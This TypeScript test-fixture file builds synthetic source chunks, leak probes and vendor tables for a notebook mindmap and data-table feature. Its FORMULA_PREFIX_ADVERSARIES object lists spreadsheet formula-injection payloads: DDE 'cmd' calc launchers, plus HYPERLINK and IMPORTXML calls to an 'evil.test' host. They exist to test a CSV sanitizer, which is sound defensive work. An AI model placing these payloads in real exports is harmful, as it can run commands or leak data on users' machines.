import type { SourceRevisionPair, UnifiedDocumentChunk } from "@everlast/contracts";

/**
 * [011-studio-mindmaps-data-tables] T002 — Shared synthetic UUIDv7 chunk/source fixtures for Package 3.3
 * Studio Mindmaps & Data Tables (FR-ST-08, FR-ST-09, FR-ST-18, C-01, C-02, C-03, NFR-EVAL-02/04;
 * FR-002, FR-003, FR-008, FR-015, FR-016, SC-001, SC-004, SC-006, SC-008, SC-009, SC-010).
 *
 * TEST-ONLY: never imported by production runtime behavior.
 */

export const STUDIO_STRUCTURE_FIXTURE_VERSION = 1;

export const STUDIO_TEST_NOTEBOOK_ID = "33000000-0000-4000-8000-000000000001";
export const STUDIO_TEST_OWNER_ID = "33000000-0000-4000-8000-000000000002";
export const STUDIO_OTHER_USER_ID = "33000000-0000-4000-8000-000000000003";
export const STUDIO_OTHER_NOTEBOOK_ID = "33000000-0000-4000-8000-000000000004";

export const STUDIO_UNSELECTED_SOURCE_ID = "33000000-0000-4000-8000-000000000999";
export const STUDIO_UNKNOWN_CHUNK_ID = "0190f330-9999-7000-8000-000000000999";
export const STUDIO_LEAK_PROBE = "VORTEX_CONFIDENTIAL_99";
export const LATE_ORIGINAL_FACT_TOKEN = "LateBatchFact-Omega-42";
export const MISSING_CELL_MARKER = "N/A (Not in sources)" as const;

export function makeStudioSourceId(ordinal: number): string {
  return `33000000-0000-4000-8000-${String(ordinal).padStart(12, "0")}`;
}

export function makeStudioChunkId(ordinal: number): string {
  return `0190f330-0000-7000-8000-${String(ordinal).padStart(12, "0")}`;
}

export function makeStudioArtifactId(ordinal: number): string {
  return `33000000-aaaa-4000-8000-${String(ordinal).padStart(12, "0")}`;
}

export function makeStudioChunk(
  ordinal: number,
  source_id: string,
  text: string,
  options: {
    revision?: number;
    locator?: UnifiedDocumentChunk["locator"];
  } = {}
): UnifiedDocumentChunk {
  const revision = options.revision ?? 1;
  const locator: UnifiedDocumentChunk["locator"] =
    options.locator ?? { page_number: 1, start_offset: 0, end_offset: text.length };
  return {
    chunk_id: makeStudioChunkId(ordinal),
    source_id,
    revision,
    locator,
    token_count: Math.max(1, Math.ceil(text.length / 4)),
    text,
  };
}

/**
 * 3-source multimodal fixture for mindmap generation & drilldown (FR-ST-08, FR-ST-09, C-01, SC-001).
 * Includes PDF page_number locators, web dom_path locators, and audio/video time_span locators,
 * plus an unselected source carrying `STUDIO_LEAK_PROBE`.
 */
export function buildThreeSourceStudioFixture() {
  const sourceA = makeStudioSourceId(101);
  const sourceB = makeStudioSourceId(102);
  const sourceC = makeStudioSourceId(103);

  const selectedChunks: UnifiedDocumentChunk[] = [
    // Source A (PDF): Platform overview & Compute
    makeStudioChunk(1, sourceA, "Cloud Platform Architecture centers on regional isolation in europe-west4 and keyless service identities."),
    makeStudioChunk(2, sourceA, "Compute Layer uses Cloud Run services for stateless APIs and event-driven background workers."),
    makeStudioChunk(3, sourceA, "API Service handles HTTP admission, scope validation, and SSE streaming within a single instance."),
    makeStudioChunk(4, sourceA, "Worker Service processes durable outbox jobs with SKIP LOCKED leases and idempotent retries."),
    makeStudioChunk(5, sourceA, "Autoscaling bounds max instances to protect downstream PostgreSQL connection pools."),
    makeStudioChunk(6, sourceA, "Container Hardening enforces non-root execution, read-only root filesystems, and distroless images."),
    // Source B (Web article with selector): Storage & Database
    makeStudioChunk(7, sourceB, "Storage Layer combines Cloud SQL PostgreSQL 16 with pgvector and regional Cloud Storage buckets.", {
      locator: { selector: "article > section:nth-of-type(1) > p:nth-of-type(1)", start_offset: 0, end_offset: 97 },
    }),
    makeStudioChunk(8, sourceB, "PostgreSQL 16 stores notebooks, sources, revisions, chunks, and studio artifacts with ACID transactions.", {
      locator: { selector: "article > section:nth-of-type(1) > p:nth-of-type(2)", start_offset: 0, end_offset: 104 },
    }),
    makeStudioChunk(9, sourceB, "Hybrid Retrieval merges HNSW cosine similarity with PostgreSQL full-text ts_rank using Reciprocal Rank Fusion.", {
      locator: { selector: "article > section:nth-of-type(2) > p:nth-of-type(1)", start_offset: 0, end_offset: 110 },
    }),
    makeStudioChunk(10, sourceB, "Object Storage keeps raw uploads and generated visual artifacts private under notebook prefixes.", {
      locator: { selector: "article > section:nth-of-type(2) > p:nth-of-type(2)", start_offset: 0, end_offset: 96 },
    }),
    makeStudioChunk(11, sourceB, "Schema Migrations run sequentially under PostgreSQL advisory locks before serving traffic.", {
      locator: { selector: "article > section:nth-of-type(3) > p:nth-of-type(1)", start_offset: 0, end_offset: 90 },
    }),
    makeStudioChunk(12, sourceB, "Backup Policy retains point-in-time recovery logs for seven days inside the EU region.", {
      locator: { selector: "article > section:nth-of-type(3) > p:nth-of-type(2)", start_offset: 0, end_offset: 86 },
    }),
    // Source C (Audio transcript with time_span): Security & Grounding
    makeStudioChunk(13, sourceC, "Security Architecture enforces strict source scope C-02, citation verification, and zero data retention.", {
      locator: { start_ms: 0, end_ms: 15_000 },
    }),
    makeStudioChunk(14, sourceC, "Scope Guard verifies owner access and exact source revision snapshots before and after model calls.", {
      locator: { start_ms: 15_000, end_ms: 30_000 },
    }),
    makeStudioChunk(15, sourceC, "Citation Verifier rejects any factual claim or label whose chunk ID or snippet is outside the snapshot.", {
      locator: { start_ms: 30_000, end_ms: 45_000 },
    }),
    makeStudioChunk(16, sourceC, "Spreadsheet Sanitizer prefixes dangerous formula characters with an apostrophe to prevent CSV injection.", {
      locator: { start_ms: 45_000, end_ms: 60_000 },
    }),
    makeStudioChunk(17, sourceC, "SVG Scene Builder emits only allowlisted geometric primitives and escaped text without scripts or external URLs.", {
      locator: { start_ms: 60_000, end_ms: 75_000 },
    }),
    makeStudioChunk(18, sourceC, "Vertex AI Integration routes Gemini 2.5 Flash requests to europe-west4 with enterprise no-training terms.", {
      locator: { start_ms: 75_000, end_ms: 90_000 },
    }),
  ];

  const unselectedChunks: UnifiedDocumentChunk[] = [
    makeStudioChunk(901, STUDIO_UNSELECTED_SOURCE_ID, `Project ${STUDIO_LEAK_PROBE} uses a secret quantum relay in Antarctica.`),
    makeStudioChunk(902, STUDIO_UNSELECTED_SOURCE_ID, `Only ${STUDIO_LEAK_PROBE} operators may access the obsidian vault.`),
  ];

  const snapshot: SourceRevisionPair[] = [
    { source_id: sourceA, revision: 1 },
    { source_id: sourceB, revision: 1 },
    { source_id: sourceC, revision: 1 },
  ];

  return {
    sourceIds: [sourceA, sourceB, sourceC] as const,
    snapshot,
    chunks: selectedChunks,
    unselectedChunks,
    allChunks: [...selectedChunks, ...unselectedChunks],
  };
}

/**
 * ≥50-source fixture with a late-only original fact absent from Source Guide summaries (FR-003, D12, SC-008).
 */
export function buildFiftySourceFixture(sourceCount = 52) {
  if (sourceCount < 50) throw new Error("sourceCount must be at least 50");
  const snapshot: SourceRevisionPair[] = [];
  const chunks: UnifiedDocumentChunk[] = [];
  const sourceGuides: { source_id: string; revision: number; summary_md: string; key_topics: string[] }[] = [];

  let chunkOrdinal = 1000;
  for (let i = 1; i <= sourceCount; i++) {
    const sourceId = makeStudioSourceId(200 + i);
    snapshot.push({ source_id: sourceId, revision: 1 });
    const c1 = makeStudioChunk(
      ++chunkOrdinal,
      sourceId,
      `Source ${i} overview: Module M-${i} processes regional telemetry streams with deterministic batching.`
    );
    const isLast = i === sourceCount;
    const c2Text = isLast
      ? `Source ${i} deep detail: ${LATE_ORIGINAL_FACT_TOKEN} is the exclusive recovery protocol for shard ${i}.`
      : `Source ${i} detail: Subsystem S-${i} validates schema invariants before committing state.`;
    const c2 = makeStudioChunk(++chunkOrdinal, sourceId, c2Text);
    chunks.push(c1, c2);
    // Source Guide summary deliberately omits LATE_ORIGINAL_FACT_TOKEN so summary-only reduction would miss it.
    sourceGuides.push({
      source_id: sourceId,
      revision: 1,
      summary_md: `Summary for Source ${i}: covers Module M-${i}.`,
      key_topics: [`Module M-${i}`],
    });
  }

  return {
    sourceCount,
    snapshot,
    chunks,
    sourceGuides,
    lateFactToken: LATE_ORIGINAL_FACT_TOKEN,
    lateFactChunkId: chunks[chunks.length - 1]!.chunk_id,
    lateFactSourceId: snapshot[snapshot.length - 1]!.source_id,
  };
}

/**
 * 3-vendor comparison fixture with supported facts, a multi-source conflict, and a missing attribute (FR-ST-18, FR-008, FR-016, SC-006).
 */
export function buildThreeVendorTableFixture() {
  const vendorAlphaSource = makeStudioSourceId(301);
  const vendorBetaSource = makeStudioSourceId(302);
  const vendorGammaSource = makeStudioSourceId(303);
  const alphaAddendumSource = makeStudioSourceId(304);

  const chunks: UnifiedDocumentChunk[] = [
    makeStudioChunk(3001, vendorAlphaSource, "Vendor Alpha Enterprise Plan costs $10/month per seat and guarantees a 99.9% Uptime SLA."),
    makeStudioChunk(3002, vendorBetaSource, "Vendor Beta Cloud Suite costs $15/month per seat and guarantees a 99.95% Uptime SLA."),
    makeStudioChunk(3003, vendorGammaSource, "Vendor Gamma Starter Edition costs $20/month per seat. No uptime guarantee is stated in this contract."),
    makeStudioChunk(3004, alphaAddendumSource, "2026 Pricing Addendum: Vendor Alpha Enterprise Plan costs $12/month per seat effective immediately."),
  ];

  const snapshot: SourceRevisionPair[] = [
    { source_id: vendorAlphaSource, revision: 1 },
    { source_id: vendorBetaSource, revision: 1 },
    { source_id: vendorGammaSource, revision: 1 },
    { source_id: alphaAddendumSource, revision: 1 },
  ];

  return {
    vendorAlphaSource,
    vendorBetaSource,
    vendorGammaSource,
    alphaAddendumSource,
    snapshot,
    chunks,
  };
}

/**
 * Adversarial strings for CSV/XLSX formula neutralization and RFC 4180 escaping (FR-009, SC-005, SC-010).
 */
export const FORMULA_PREFIX_ADVERSARIES = {
  equalsFormula: "=SUM(A1:A2)",
  plusFormula: "+cmd|' /C calc'!A0",
  minusFormula: "-2+3+cmd|' /C calc'!A0",
  atFormula: '@HYPERLINK("https://evil.test/steal")',
  leadingSpaceEquals: "   =IMPORTXML(\"https://evil.test\",\"//a\")",
  leadingTabPlus: "\t+1+1",
  leadingCrLfMinus: "\r\n-1+1",
  leadingNullAt: "\u0000@SUM(1,2)",
  csvSpecialChars: 'Café "Éclair", München\r\nLine 2 — €49',
} as const;

/**
 * Label & prompt boundary strings in Unicode code points (FR-002, FR-007, FR-013, SC-008).
 * Uses multi-byte emoji ("🧪") to verify code-point counting rather than UTF-16 code units.
 */
export function makeCodePointString(codePoints: number, char = "🧪"): string {
  return char.repeat(codePoints);
}
